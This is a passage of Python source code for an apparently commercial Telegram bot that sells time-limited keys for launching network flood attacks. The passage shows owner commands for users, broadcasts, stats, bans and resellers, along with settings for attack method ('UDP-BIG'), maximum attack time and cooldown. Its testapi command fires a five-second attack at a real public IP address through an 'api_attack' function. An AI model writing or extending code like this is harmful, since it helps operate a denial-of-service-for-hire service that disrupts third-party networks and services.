            f"  ◆ ⏰ ᴀᴅᴅᴇᴅ ➪ <b>+{human_readable(secs)}</b>\n"
            f"  ◆ 📅 ᴇxᴘɪʀᴇꜱ ➪ <code>{expiry_ist} IST</code>\n"
            f"  ◆ ⏳ ʀᴇᴍᴀɪɴɪɴɢ ➪ <b>{time_remaining(uid)}</b>",
            parse_mode="HTML",
            reply_markup=kb_main(uid))
    except Exception as e:
        print(f"❌ cmd_redeem error: {e}")

# ============= OWNER PANEL — ALL COMMANDS ★★★ =============
@bot.message_handler(commands=['panel'])
def cmd_panel(msg):
    react_to_message(msg)
    try:
        if not is_owner(msg.from_user.id): return
        safe_reply(msg,
            "╔══════════════════════════╗\n"
            "║         📊 🅾︎🆆︎🅽︎🅴︎🆁︎ 🅿︎🅰︎🅽︎🅴︎🅻︎ 🔓        ║\n"
            "╚══════════════════════════╝\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃       ⚡ 𝗢𝗪𝗡𝗘𝗥 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 🐦‍🔥          ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "  ◆ 👑 /panel ➪ ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ\n"
            "  ◆ 👥 /users ➪ ʟɪᴠᴇ ᴜꜱᴇʀꜱ\n"
            "  ◆ 📊 /stats ➪ ꜱᴛᴀᴛꜱ\n"
            "  ◆ 📢 /broadcast MSG\n"
            "  ◆ 🚫 /ban ID REASON\n"
            "  ◆ ✅ /unban ID\n"
            "  ◆ 🔑 /genkey 1d 5\n"
            "  ◆ 📡 /setapi URL TOKEN\n"
            "  ◆ 🧪 /testapi\n"
            "  ◆ ⏱️ /setmaxtime SEC\n"
            "  ◆ ⏸️ /setcooldown SEC\n"
            "  ◆ 🔧 /maintenance\n"
            "  ◆ 📩 /feedback on|off|list\n"
            "  ◆ ⚙️ /settings\n"
            "  ◆ 🗝️ /listkeys ➪ ᴋᴇʏ ʟɪꜱᴛ\n"
            "  ◆ 🌌 /delkey KEY ➪ ᴋᴇʏ ᴅᴇʟᴇᴛᴇ\n"
            "  ◆ 🐼 /delallkeys ➪ ꜱᴀᴀʀɪ ᴜɴᴜꜱᴇᴅ ᴋᴇʏꜱ ᴅᴇʟᴇᴛᴇ\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃        ❄ 𝗦𝗧𝗜𝗖𝗞𝗘𝗥 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 🐻‍❄️      ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "  ◆ 🎨 ꜱᴇɴᴅ ꜱᴛɪᴄᴋᴇʀ ➪ ᴀᴅᴅ\n"
            "  ◆ 📋 /liststickers\n"
            "  ◆ 🗑️ /removesticker NUM\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃           📹 𝗩𝗜𝗗𝗘𝗢 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 🎥        ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "  ◆ 🎬 ꜱᴇɴᴅ ᴠɪᴅᴇᴏ ➪ ᴀᴛᴛᴀᴄᴋ ᴍᴇ ᴀᴀʏᴇɢᴀ\n"
            "  ◆ 📋 /listvideo\n"
            "  ◆ 🗑️ /delvideo NUM\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃       🎬 𝗣𝗬𝗙 𝗩𝗜𝗗𝗘𝗢 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 📽️    ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "  ◆ 🎬 /addpyf ➪ ᴘʏꜰ ᴀᴅᴅ\n"
            "  ◆ 📋 /listpyf ➪ ʟɪꜱᴛ\n"
            "  ◆ 🗑️ /delpyf NUM ➪ ʀᴇᴍᴏᴠᴇ\n\n"
            "╔══════════════════════════╗\n"
            "║                🦪 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗕𝗢𝗧 🦠              ║\n"
            "╚══════════════════════════╝",
            parse_mode="HTML")
    except Exception as e: print(f"❌ cmd_panel error: {e}")

# ============= USERS LIVE =============
def do_users(msg):
    react_to_message(msg)
    try:
        if not is_owner(msg.from_user.id): return
        if not ensure_dict(data.get("users", {})):
            safe_reply(msg, "📂 <b>ɴᴏ ᴜꜱᴇʀꜱ.</b>", parse_mode="HTML"); return

        users_msg = safe_send(msg.chat.id, "👥 ʟᴏᴀᴅɪɴɢ ʟɪᴠᴇ ᴜꜱᴇʀꜱ...")
        if not users_msg: return

        current_mid = [users_msg.message_id]

        def build_users_live():
            try:
                now = ist_now()
                total = len(ensure_dict(data.get("users", {})))
                txt = (
                    "╔══════════════════════════╗\n"
                    "║             🥮 𝗟𝗜𝗩𝗘 𝗨𝗦𝗘𝗥𝗦 𝗟𝗜𝗦𝗧 🥡             ║\n"
                    "╚══════════════════════════╝\n\n"
                    "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    f"┃                 📊 ᴛᴏᴛᴀʟ ➪ <b>{total}</b> ᴜꜱᴇʀꜱ               ┃\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
                )
                for u_id, u in list(ensure_dict(data.get("users", {})).items())[:20]:
                    if not isinstance(u, dict): continue
                    if u_id in ensure_dict(data.get("banned_users", {})):
                        time_str = "🚫 ʙᴀɴɴᴇᴅ"; status = "🚫"
                    elif u.get('key_expiry'):
                        exp = safe_parse_dt(u['key_expiry'])
                        if exp:
                            rem = exp - now
                            total_sec = int(rem.total_seconds())
                            if total_sec <= 0:
                                time_str = "❌ ᴇxᴘɪʀᴇᴅ"; status = "🔴"
                            else:
                                d = total_sec // 86400; h = (total_sec % 86400) // 3600
                                m = (total_sec % 3600) // 60; s = total_sec % 60
                                time_str = f"{d:02d}ᴅ {h:02d}ʜ {m:02d}ᴍ {s:02d}ꜱ"; status = "🟢"
                        else:
                            time_str = "❌ ɴᴏ ᴋᴇʏ"; status = "🔴"
                    else:
                        time_str = "❌ ɴᴏ ᴋᴇʏ"; status = "🔴"

                    uname = escape_html(u.get('username', 'N/A'))
                    atks = safe_int(u.get('total_attacks', 0))
                    txt += f"  ◆ {status} <code>{u_id}</code>\n"
                    txt += f"    ┣ 👤 @{uname}\n"
                    txt += f"    ┣ ⏰ <b>{time_str}</b>\n"
                    txt += f"    ┗ 💀 {atks} ᴀᴛᴋꜱ\n\n"
                if total > 20: txt += f"\n  ... ᴀɴᴅ {total - 20} ᴍᴏʀᴇ ᴜꜱᴇʀꜱ\n"
                txt += f"\n╔══════════════════════════╗\n║                ⏲️ {ist_time_str()} IST ⏰\n╚══════════════════════════╝"
                return txt
            except Exception as e:
                print(f"Build users error: {e}"); return "⚠️ ᴜꜱᴇʀꜱ ᴛᴇᴍᴘᴏʀᴀʀɪʟʏ ᴜɴᴀᴠᴀɪʟᴀʙʟᴇ"

        r = safe_edit_text(users_msg.chat.id, current_mid[0], build_users_live(), parse_mode="HTML")
        if r is None:
            try: bot.delete_message(users_msg.chat.id, current_mid[0])
            except: pass
            try:
                nm = bot.send_message(users_msg.chat.id, build_users_live(), parse_mode="HTML")
                current_mid[0] = nm.message_id
            except: return

        def auto_update_users():
            last_text = None
            start_ts = time.time()
            for _ in range(int(AUTO_STOP_AFTER / UPDATE_INTERVAL) + 5):
                time.sleep(UPDATE_INTERVAL)
                if time.time() - start_ts > AUTO_STOP_AFTER:
                    print(f"⏹️ Users auto-update stopped after {AUTO_STOP_AFTER}s")
                    try:
                        stopped_text = build_users_live() + "\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n⏹️ <i>ᴜᴘᴅᴀᴛᴇꜱ ꜱᴛᴏᴘᴘᴇᴅ (2 ᴍɪɴ ʟɪᴍɪᴛ) — ꜰʀᴇꜱʜ ʟɪꜱᴛ ᴋᴇ ʟɪʏᴇ /users ᴅᴏʙᴀʀᴀ ʙʜᴇᴊᴏ</i>"
                        safe_edit_text(users_msg.chat.id, current_mid[0], stopped_text, parse_mode="HTML")
                    except: pass
                    break
                try:
                    new_text = build_users_live()
                    if new_text != last_text:
                        r = safe_edit_text(users_msg.chat.id, current_mid[0], new_text, parse_mode="HTML")
                        if r is None:
                            try: bot.delete_message(users_msg.chat.id, current_mid[0])
                            except: pass
                            try:
                                nm = bot.send_message(users_msg.chat.id, new_text, parse_mode="HTML")
                                current_mid[0] = nm.message_id
                            except: pass
                        elif r != "NOT_MODIFIED":
                            last_text = new_text
                except Exception as e:
                    print(f"auto_update_users err: {e}")
                    time.sleep(2)

        threading.Thread(target=auto_update_users, daemon=True).start()
    except Exception as e:
        print(f"❌ do_users error: {e}")

@bot.message_handler(commands=['users'])
def cmd_users(msg):
    react_to_message(msg)
    do_users(msg)

# ============= BROADCAST =============
@bot.message_handler(commands=['broadcast'])
def cmd_broadcast(msg):
    react_to_message(msg)
    try:
        if not is_owner(msg.from_user.id): return
        p = msg.text.split(maxsplit=1)
        if len(p) < 2:
            safe_reply(msg,
                "╔══════════════════════════╗\n"
                "║        📨 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 📝       ║\n"
                "╚══════════════════════════╝\n\n"
                "  ◆ 📝 <code>/broadcast YOUR MESSAGE</code>\n\n"
                "  ◆ 📌 <code>/broadcast 🔥 New update!</code>\n\n"
                f"  ◆ 👥 ᴛᴏᴛᴀʟ: <b>{len(ensure_dict(data.get('users', {})))}</b>",
                parse_mode="HTML")
            return

        text = p[1]
        total = len(ensure_dict(data.get("users", {})))

        broadcast_header = (
          "╔══════════════════════════╗\n"
          "║                ⚠️ 𝗡𝗢𝗧𝗜𝗖𝗘 𝗕𝗢𝗔𝗥𝗗 🚫            ║\n"
          "╚══════════════════════════╝\n\n"
        )
        broadcast_footer = (
          "\n\n█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█\n"
          "█   ▸  ˹Iɴғᴏʀᴍ BY˼ 🪽 ➪ 𝜝𝜣𝜯 𝑭𝜟𝜯𝜢𝜮𝜞 ◂  █\n"
          "█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█\n"
          " \n"
          "╭──────────────────────╮\n"
          f"│               🕰️ {ist_time_str()} 𝙸𝚂𝚃         │\n"
          "╰──────────────────────╯"
        )
        full_message = broadcast_header + text + broadcast_footer

        status_msg = bot.reply_to(msg,
            "📤 <b>ꜱᴇɴᴅɪɴɢ ᴛᴏ " + str(total) + " ᴜꜱᴇʀꜱ...</b>",
            parse_mode="HTML")

        def do_broadcast():
            sent = 0
            failed = 0
            banned_skip = 0
            all_uids = list(ensure_dict(data.get("users", {})).keys())

            for i, uid_str in enumerate(all_uids, 1):
                try:
                    uid_int = int(uid_str)
                except (ValueError, TypeError):
                    failed += 1
                    continue

                if uid_str in ensure_dict(data.get("banned_users", {})):
                    banned_skip += 1
                    continue

                success = False
                for attempt in range(3):
                    try:
                        bot.send_message(uid_int, full_message, parse_mode="HTML")
                        success = True
                        sent += 1
                        break
                    except Exception as e:
                        err_str = str(e).lower()
                        if "blocked" in err_str or "chat not found" in err_str or "user is deactivated" in err_str or "kicked" in err_str:
                            failed += 1
                            break
                        if "too many requests" in err_str or "retry after" in err_str:
                            m = re.search(r'retry after (\d+)', err_str)
                            wait = int(m.group(1)) if m else 5
                            print(f"⚠️ Broadcast flood, waiting {wait}s")
                            time.sleep(wait + 1)
                            continue
                        failed += 1
                        break

                if not success and attempt == 2:
                    failed += 1

                if i % 5 == 0 or i == total:
                    try:
                        safe_edit_text(status_msg.chat.id, status_msg.message_id,
                            f"📤 <b>ᴘʀᴏɢʀᴇꜱꜱ:</b> {i}/{total}\n"
                            f"  ◆ ✅ ꜱᴇɴᴛ: {sent}\n"
                            f"  ◆ ❌ ꜰᴀɪʟᴇᴅ: {failed}\n"
                            f"  ◆ 🚫 ʙᴀɴɴᴇᴅ: {banned_skip}",
                            parse_mode="HTML")
                    except: pass

                time.sleep(0.5)

            try:
                safe_edit_text(status_msg.chat.id, status_msg.message_id,
                    f"╔══════════════════════════╗\n"
                    f"║             ☑️ 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 𝗗𝗢𝗡𝗘 ☑️         ║\n"
                    f"╚══════════════════════════╝\n\n"
                    f"  ◆ ✅ ꜱᴇɴᴛ ➪ <b>{sent}</b>\n"
                    f"  ◆ ❌ ꜰᴀɪʟᴇᴅ ➪ <b>{failed}</b>\n"
                    f"  ◆ 🚫 ʙᴀɴɴᴇᴅ ➪ <b>{banned_skip}</b>\n\n"
                    f"  ◆ 🕐 ᴛɪᴍᴇ ➪ <code>{ist_time_str()} IST</code>",
                    parse_mode="HTML")
            except: pass

        threading.Thread(target=do_broadcast, daemon=True).start()
    except Exception as e: print(f"❌ cmd_broadcast error: {e}")

# ============= STATS =============
def do_stats(msg):
    react_to_message(msg)
    try:
        if not is_owner(msg.from_user.id): return
        used_keys = sum(1 for k, v in ensure_dict(data.get("keys", {})).items() if isinstance(v, dict) and v.get('used'))
        unused_keys = len(ensure_dict(data.get("keys", {}))) - used_keys
        uptime_sec = int((ist_now() - BOT_START_TIME).total_seconds())
        days = uptime_sec // 86400; hrs = (uptime_sec % 86400) // 3600
        mins = (uptime_sec % 3600) // 60; secs = uptime_sec % 60
        uptime_str = f"{days:02d}ᴅ {hrs:02d}ʜ {mins:02d}ᴍ {secs:02d}ꜱ"

        api_status = HEALTH.get("api_status", "🟡 ᴜɴᴋɴᴏᴡɴ")
        api_ping = safe_int(HEALTH.get("last_api_ping_ms", 0))
        api_success = safe_int(HEALTH.get("api_success", 0))
        api_failed = safe_int(HEALTH.get("api_failed", 0))
        total_errors = safe_int(HEALTH.get("total_errors", 0))
        total_msgs = safe_int(HEALTH.get("total_messages", 0))
        total_cmds = safe_int(HEALTH.get("total_commands", 0))
        total_attacks_h = safe_int(HEALTH.get("total_attacks", 0))

        txt = (
            "╔══════════════════════════╗\n"
            "║               📊 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗦𝗧𝗔𝗧𝗦 🪯           ║\n"
            "╚══════════════════════════╝\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃                       🚹 𝗨𝗦𝗘𝗥𝗦 🚺                   ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"  ◆ 👥 ᴛᴏᴛᴀʟ ➪ <b>{len(ensure_dict(data.get('users', {})))}</b>\n"
            f"  ◆ 👑 ᴀᴅᴍɪɴꜱ ➪ <b>{len(ensure_dict(data.get('admins', {})))}</b>\n"
            f"  ◆ 💼 ʀᴇꜱᴇʟʟᴇʀꜱ ➪ <b>{len(ensure_dict(data.get('resellers', {})))}</b>\n"
            f"  ◆ 🚫 ʙᴀɴɴᴇᴅ ➪ <b>{len(ensure_dict(data.get('banned_users', {})))}</b>\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃                      🗝️ 𝗞𝗘𝗬𝗦 🔏                    ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"  ◆ 🔑 ᴛᴏᴛᴀʟ ➪ <b>{len(ensure_dict(data.get('keys', {})))}</b>\n"
            f"  ◆ ✅ ᴜꜱᴇᴅ ➪ <b>{used_keys}</b>\n"
            f"  ◆ 🆓 ᴀᴠᴀɪʟ ➪ <b>{unused_keys}</b>\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃                      🧟 𝗔𝗧𝗧𝗔𝗖𝗞𝗦 🧙               ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"  ◆ 💀 ᴛᴏᴛᴀʟ ➪ <b>{len(ensure_list(data.get('attack_logs', [])))}</b>\n"
            f"  ◆ ⏱️ ᴍᴀx ➪ <b>{get_setting('max_attack_time', 300)}ꜱ</b>\n"
            f"  ◆ ⏸️ ᴄᴅ ➪ <b>{get_setting('user_cooldown', 5)}ꜱ</b>\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃                     💚 𝗛𝗘𝗔𝗟𝗧𝗛 💚                   ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"  ◆ 🏥 ʜᴇᴀʟᴛʜ ➪ {'🟢 ʜᴇᴀʟᴛʜʏ' if api_success > 0 and api_failed < 5 else ('🟡 ᴍɪɴᴏʀ' if api_failed < 10 else '🔴 ᴜɴꜱᴛᴀʙʟᴇ')}\n"
            f"  ◆ 📡 ᴀᴘɪ ➪ {api_status}\n"
            f"  ◆ ⚡ ᴘɪɴɢ ➪ <b>{api_ping}ᴍꜱ</b>\n"
            f"  ◆ ✅ ᴀᴘɪ ᴏᴋ ➪ <b>{api_success}</b>\n"
            f"  ◆ ❌ ᴀᴘɪ ꜰᴀɪʟ ➪ <b>{api_failed}</b>\n"
            f"  ◆ 💬 ᴍꜱɢꜱ ➪ <b>{total_msgs}</b>\n"
            f"  ◆ ⚙️ ᴄᴍᴅꜱ ➪ <b>{total_cmds}</b>\n"
            f"  ◆ 💀 ᴀᴛᴋꜱ ➪ <b>{total_attacks_h}</b>\n"
            f"  ◆ ⚠️ ᴇʀʀᴏʀꜱ ➪ <b>{total_errors}</b>\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃                   🎨 𝗖𝗢𝗡𝗧𝗘𝗡𝗧 🎸                 ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"  ◆ ❄ ꜱᴛɪᴄᴋᴇʀꜱ ➪ <b>{len(ensure_list(data.get('stickers', [])))}</b>\n"
            f"  ◆ 📹 ᴠɪᴅᴇᴏꜱ ➪ <b>{len(ensure_list(data.get('videos', [])))}</b>\n"
            f"  ◆ 🎬 ᴘʏꜰ ➪ <b>{len(ensure_list(data.get('pyf_videos', [])))}</b>\n"
            f"  ◆ 📩 ꜰᴇᴇᴅʙᴀᴄᴋꜱ ➪ <b>{len(ensure_list(data.get('feedbacks', [])))}</b>\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃                     ⚙️ 𝗦𝗬𝗦𝗧𝗘𝗠 🔅                  ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"  ◆ ⏱️ ᴜᴘᴛɪᴍᴇ ➪ <b>{uptime_str}</b>\n"
            f"  ◆ 🔧 ᴍᴀɪɴᴛ ➪ <b>{'🟢 ᴏɴ' if get_setting('maintenance_mode', False) else '🔴 ᴏꜰꜰ'}</b>\n"
            f"  ◆ 📩 ꜰᴇᴇᴅʙᴀᴄᴋ ➪ <b>{'🟢 ᴏɴ' if data.get('feedback_enabled', False) else '🔴 ᴏꜰꜰ'}</b>\n"
            f"  ◆ 📡 ᴍᴇᴛʜᴏᴅ ➪ <code>{escape_html(get_setting('api_method', 'UDP-BIG'))}</code>\n"
            f"  ◆ 🕐 ɴᴏᴡ ➪ <code>{ist_time_str()} IST</code>\n\n"
            "╔══════════════════════════╗\n"
            "║                   🤖 𝗕𝗢𝗧 𝗢𝗡𝗟𝗜𝗡𝗘 🗳️               ║\n"
            "╚══════════════════════════╝"
        )
        safe_reply(msg, txt, parse_mode="HTML")
    except Exception as e: print(f"❌ do_stats error: {e}")

@bot.message_handler(commands=['stats'])
def cmd_stats(msg):
    react_to_message(msg)
    do_stats(msg)

# ============= BAN/UNBAN =============
@bot.message_handler(commands=['ban'])
def cmd_ban(msg):
    react_to_message(msg)
    try:
        if not is_owner(msg.from_user.id): return
        p = msg.text.split(maxsplit=2)
        if len(p) < 2: safe_reply(msg, "⚠️ <code>/ban USER_ID [REASON]</code>", parse_mode="HTML"); return
        target_id = p[1]
        reason = p[2] if len(p) > 2 else "ᴠɪᴏʟᴀᴛɪᴏɴ ᴏꜰ ᴛᴇʀᴍꜱ"
        data["banned_users"][target_id] = {
            "banned_at": ist_now().isoformat(),
            "banned_by": msg.from_user.id, "reason": reason
        }
        save_data(data)
        try:
            bot.send_message(int(target_id),
                "🚫 <b>ʏᴏᴜ ᴀʀᴇ ʙᴀɴɴᴇᴅ!</b>\n\n"
                f"  ◆ 📝 ʀᴇᴀꜱᴏɴ: <i>{escape_html(reason)}</i>\n"
                f"  ◆ 👑 ᴏᴡɴᴇʀ: <code>{BOT_OWNER}</code>", parse_mode="HTML")
        except: pass
        safe_reply(msg, f"✅ <b>ᴜꜱᴇʀ ʙᴀɴɴᴇᴅ!</b>\n  ◆ 🆔 <code>{target_id}</code>", parse_mode="HTML")
    except Exception as e: print(f"❌ cmd_ban error: {e}")

@bot.message_handler(commands=['unban'])
def cmd_unban(msg):
    react_to_message(msg)
    try:
        if not is_owner(msg.from_user.id): return
        p = msg.text.split()
        if len(p) < 2: safe_reply(msg, "⚠️ /unban ID"); return
        target_id = p[1]
        if target_id in ensure_dict(data.get("banned_users", {})):
            del data["banned_users"][target_id]; save_data(data)
            try:
                bot.send_message(int(target_id),
                    "✅ <b>ʏᴏᴜ ᴀʀᴇ ᴜɴʙᴀɴɴᴇᴅ!</b>\n🚀 /start", parse_mode="HTML")
            except: pass
            safe_reply(msg, f"✅ <b>ᴜɴʙᴀɴɴᴇᴅ</b> <code>{target_id}</code>", parse_mode="HTML")
        else: safe_reply(msg, "❌ ɴᴏᴛ ʙᴀɴɴᴇᴅ")
    except Exception as e: print(f"❌ cmd_unban error: {e}")

# ============= SETAPI =============
@bot.message_handler(commands=['setapi'])
def cmd_setapi(msg):
    react_to_message(msg)
    try:
        if not is_owner(msg.from_user.id): return
        p = msg.text.split()
        if len(p) < 3:
            safe_reply(msg,
                "╔══════════════════════════╗\n"
                "║              📡 𝗔𝗣𝗜 𝗦𝗘𝗧𝗨𝗣 𝗚𝗨𝗜𝗗𝗘 🛜           ║\n"
                "╚══════════════════════════╝\n\n"
                "  <code>/setapi URL TOKEN [METHOD] [GEO]</code>",
                parse_mode="HTML")
            return

        set_setting("api_url", p[1]); set_setting("api_token", p[2])
        if len(p) > 3: set_setting("api_method", p[3])
        if len(p) > 4: set_setting("api_geolocation", p[4])

        safe_reply(msg,
            "╔══════════════════════════╗\n"
            "║                  ✅ 𝗔𝗣𝗜 𝗨𝗣𝗗𝗔𝗧𝗘𝗗 ✅              ║\n"
            "╚══════════════════════════╝\n\n"
            f"  ◆ 🌐 ᴜʀʟ ➪ <code>{escape_html(p[1])}</code>\n"
            f"  ◆ 🔐 ᴛᴏᴋᴇɴ ➪ <code>{escape_html(p[2][:25])}...</code>\n"
            f"  ◆ 🎯 ᴍᴇᴛʜᴏᴅ ➪ <code>{escape_html(get_setting('api_method','UDP-BIG'))}</code>\n"
            f"  ◆ 🌍 ɢᴇᴏ ➪ <code>{escape_html(get_setting('api_geolocation','ALL'))}</code>",
            parse_mode="HTML")
    except Exception as e: print(f"❌ cmd_setapi error: {e}")

# ============= TESTAPI =============
@bot.message_handler(commands=['testapi'])
def cmd_testapi(msg):
    react_to_message(msg)
    try:
        uid = msg.from_user.id
        if not is_owner(uid):
            safe_reply(msg, "🚫 ᴏᴡɴᴇʀ ᴏɴʟʏ!", parse_mode="HTML")
            return
        cid = msg.chat.id

        try:
            loading_msg = bot.reply_to(msg, 
                "╔══════════════════════════╗\n"
                "║                  🧪 ᴛᴇꜱᴛɪɴɢ ▱ ᴀᴘɪ ♡                 ║\n"
                "╚══════════════════════════╝\n\n"
                "  ▱▱▱▱▱▱▱▱▱▱ 0%\n"
                "  ⏳ 𝐒𝐭𝐚𝐫𝐭𝐢𝐧𝐠...", 
                parse_mode="HTML")
        except: return

        def run_test():
            try:
                steps = [
                    ("▰▱▱▱▱▱▱▱▱▱", "10%", "🌐 ᴄᴏɴɴᴇᴄᴛɪɴɢ ᴛᴏ ꜱᴇʀᴠᴇʀ..."),
                    ("▰▰▰▱▱▱▱▱▱▱", "30%", "🔑 ᴠᴇʀɪꜰʏɪɴɢ ᴛᴏᴋᴇɴ..."),
                    ("▰▰▰▰▰▱▱▱▱▱", "50%", "📡 ᴘɪɴɢɪɴɢ ᴀᴘɪ..."),
                    ("▰▰▰▰▰▰▰▱▱▱", "70%", "⚙️ ʟᴏᴀᴅɪɴɢ ʀᴇꜱᴘᴏɴꜱᴇ..."),
                    ("▰▰▰▰▰▰▰▰▰▱", "90%", "🔄 ᴘʀᴏᴄᴇꜱꜱɪɴɢ ᴅᴀᴛᴀ..."),
                ]
                for bar, pct, status in steps:
                    time.sleep(0.5)
                    anim_text = (
                        "╔══════════════════════════╗\n"
                        "║                  🧪 ᴛᴇꜱᴛɪɴɢ ▱ ᴀᴘɪ ♡                 ║\n"
                        "╚══════════════════════════╝\n\n"
                        f"  {bar} {pct}\n"
                        f"  {status}"
                    )
                    safe_edit_text(cid, loading_msg.message_id, anim_text, parse_mode="HTML")

                start = time.time()
                ok, r = api_attack("1.1.1.1", 80, 5)
                elapsed_ms = int((time.time() - start) * 1000)

                time.sleep(0.6)

                if ok:
                    final_text = (
                        "╔══════════════════════════╗\n"
                        "║                ✅ 𝗔𝗣𝗜 𝗧𝗘𝗦𝗧 𝗣𝗔𝗦𝗦 ✅              ║\n"
                        "╚══════════════════════════╝\n\n"
                        f"  ◆ ⚡ ꜱᴛᴀᴛᴜꜱ ➪ 🟢 <b>ᴏɴʟɪɴᴇ</b>\n"
                        f"  ◆ ⏱️ ʟᴀᴛᴇɴᴄʏ ➪ <b>{elapsed_ms}ᴍꜱ</b>\n"
                        f"  ◆ 📩 ʀᴇꜱᴘᴏɴꜱᴇ ➪ <code>{escape_html(r[:200])}</code>"
                    )
                else:
                    final_text = (
                        "╔══════════════════════════╗\n"
                        "║                ❌ 𝗔𝗣𝗜 𝗧𝗘𝗦𝗧 𝗙𝗔𝗜𝗟 ❌               ║\n"
                        "╚══════════════════════════╝\n\n"
                        f"  ◆ ⚡ ꜱᴛᴀᴛᴜꜱ ➪ 🔴 <b>ꜰᴀɪʟᴇᴅ</b>\n"
                        f"  ◆ ⏱️ ʟᴀᴛᴇɴᴄʏ ➪ <b>{elapsed_ms}ᴍꜱ</b>\n"
                        f"  ◆ 📩 ᴇʀʀᴏʀ ➪ <code>{escape_html(r[:200])}</code>"
                    )

                r2 = safe_edit_text(cid, loading_msg.message_id, final_text, parse_mode="HTML")
                if r2 is None:
                    try:
                        bot.send_message(cid, final_text, parse_mode="HTML")
                    except: pass
            except Exception as e:
                print(f"❌ Testapi thread error: {e}")

        threading.Thread(target=run_test, daemon=True).start()
    except Exception as e: 
        print(f"❌ cmd_testapi error: {e}")

@bot.message_handler(commands=['setmaxtime'])
def cmd_setmaxtime(msg):
    react_to_message(msg)
    try:
        if not is_owner(msg.from_user.id): return
        p = msg.text.split()
        if len(p) < 2: safe_reply(msg, "⚠️ /setmaxtime SEC"); return
        try:
            set_setting("max_attack_time", int(p[1]))
            safe_reply(msg, f"✅ <b>ᴍᴀx ᴛɪᴍᴇ:</b> {p[1]}ꜱ", parse_mode="HTML")
        except: safe_reply(msg, "❌ ɪɴᴠᴀʟɪᴅ")
    except Exception as e: print(f"❌ setmaxtime error: {e}")

@bot.message_handler(commands=['setcooldown'])
def cmd_setcooldown(msg):
    react_to_message(msg)
    try:
        if not is_owner(msg.from_user.id): return
        p = msg.text.split()
        if len(p) < 2: safe_reply(msg, "⚠️ /setcooldown SEC"); return
        try:
            set_setting("user_cooldown", int(p[1]))
            safe_reply(msg, f"✅ <b>ᴄᴏᴏʟᴅᴏᴡɴ:</b> {p[1]}ꜱ", parse_mode="HTML")
        except: safe_reply(msg, "❌ ɪɴᴠᴀʟɪᴅ")
    except Exception as e: print(f"❌ setcooldown error: {e}")

@bot.message_handler(commands=['maintenance'])
def cmd_maintenance(msg):
    react_to_message(msg)
    try:
        if not is_owner(msg.from_user.id): return
        cur = get_setting('maintenance_mode', False)
        set_setting("maintenance_mode", not cur)
        if not cur:
            safe_reply(msg, "✅ <b>ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ ᴇɴᴀʙʟᴇᴅ!</b>", parse_mode="HTML")
        else:
            safe_reply(msg, "✅ <b>ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ ᴅɪꜱᴀʙʟᴇᴅ!</b>", parse_mode="HTML")
    except Exception as e: print(f"❌ maintenance error: {e}")

# ============= ★★★ STICKER/VIDEO/PYF COMMANDS — FIXED ★★★ =============
@bot.message_handler(commands=['liststickers'])
def cmd_liststickers(msg):
    react_to_message(msg)
    try:
        if not is_owner(msg.from_user.id): return
        stickers = ensure_list(data.get("stickers", []))
        if not stickers:
            safe_reply(msg,
                "╔══════════════════════════╗\n"
                "║               ❄ 𝗦𝗧𝗜𝗖𝗞𝗘𝗥 𝗟𝗜𝗦𝗧 🐻‍❄️                 ║\n"
                "╚══════════════════════════╝\n\n"
                "  📂 <b>ᴋᴏɪ ꜱᴛɪᴄᴋᴇʀ ɴᴀʜɪ ʜᴀɪ</b>\n\n"
                "  📌 <b>ᴀᴅᴅ ᴋᴀʀɴᴇ ᴋᴇ ʟɪʏᴇ:</b>\n"
                "  ◆ ᴋᴏɪ ʙʜɪ ꜱᴛɪᴄᴋᴇʀ ʙᴏᴛ ᴋᴏ ʙʜᴇᴊᴏ\n"
                "  ◆ ᴠᴏ ᴀᴜᴛᴏᴍᴀᴛɪᴄᴀʟʟʏ ᴀᴅᴅ ʜᴏ ᴊᴀʏᴇɢᴀ",
                parse_mode="HTML")
